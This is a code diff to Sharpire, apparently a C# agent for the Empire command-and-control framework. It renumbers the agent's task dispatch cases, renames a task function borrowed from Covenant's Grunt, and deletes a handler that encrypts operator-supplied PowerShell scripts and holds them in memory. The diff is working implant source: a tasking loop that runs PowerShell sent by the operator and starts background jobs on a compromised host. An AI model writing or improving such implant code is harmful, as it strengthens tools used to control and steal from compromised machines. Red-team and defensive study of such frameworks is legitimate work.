@@ -260,9 +260,6 @@ namespace Sharpire
                         return Task42(packet);
                     case 43:
                         return Task43(packet);
-                    case 44:
-                        jobTracking.jobs[taskId.ToString()].Status = "completed";
-                        return Task44(packet);
                     case 50:
                         jobTracking.jobs[taskId.ToString()].Status = "completed";
                         return GenerateRunningJobsTable(packet);
@@ -273,20 +270,19 @@ namespace Sharpire
                         jobTracking.jobs[taskId.ToString()].Status = "completed";
                         return EncodePacket(packet.type, Agent.RunPowerShell(packet.data), packet.taskId);
                     case 101:
+                    case 102:
                         jobTracking.jobs[taskId.ToString()].Status = "completed";
                         return Task101(packet);
-                    case 110:
-                        jobTracking.StartAgentJob(packet.data, packet.taskId);
-                        jobTracking.jobs[taskId.ToString()].Status = "running";
-                        return EncodePacket(packet.type, "Job started: " + taskId.ToString(), packet.taskId);
-                    case 111:
-                        return EncodePacket(packet.type, "Not Implemented", packet.taskId);
-                    case 120:
-                        jobTracking.jobs[taskId.ToString()].Status = "completed";
-                        return Task120(packet);
                     case 121:
                         jobTracking.jobs[taskId.ToString()].Status = "completed";
                         return Task121(packet);
+                    case 122:
+                        jobTracking.jobs[taskId.ToString()].Status = "completed";
+                        return Task122(packet);
+                    case 123:
+                        jobTracking.StartAgentJob(packet.data, packet.taskId);
+                        jobTracking.jobs[taskId.ToString()].Status = "running";
+                        return EncodePacket(packet.type, "Job started: " + taskId.ToString(), packet.taskId);
                     default:
                         jobTracking.jobs[taskId.ToString()].Status = "error";
                         return EncodePacket(0, "Invalid type: " + packet.type, packet.taskId);
@@ -593,7 +589,7 @@ namespace Sharpire
 
         //Since Empire is using the COvenant tasks this is just taken from the Covenant Grunt
         // https://github.com/cobbr/Covenant/blob/master/Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs#L236
-        public Byte[] Task44(PACKET packet)
+        public Byte[] Task122(PACKET packet)
         {
             const int Delay = 1;
             const int MAX_MESSAGE_SIZE = 1048576;
@@ -713,18 +709,6 @@ namespace Sharpire
             string extension = packet.data.Substring(15, 5);
             string output = Agent.RunPowerShell(packet.data.Substring(20));
             return EncodePacket(packet.type, prefix + extension + output, packet.taskId);
-        }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        // Load PowerShell Script
-        ////////////////////////////////////////////////////////////////////////////////
-        public byte[] Task120(PACKET packet)
-        {
-            Random random = new Random();
-            byte[] initializationVector = new byte[16];
-            random.NextBytes(initializationVector);
-            jobTracking.ImportedScript = EmpireStager.aesEncrypt(sessionInfo.GetSessionKeyBytes(), initializationVector, Encoding.ASCII.GetBytes(packet.data));
-            return EncodePacket(packet.type, "Script successfully saved in memory", packet.taskId);
         }
 
         ////////////////////////////////////////////////////////////////////////////////
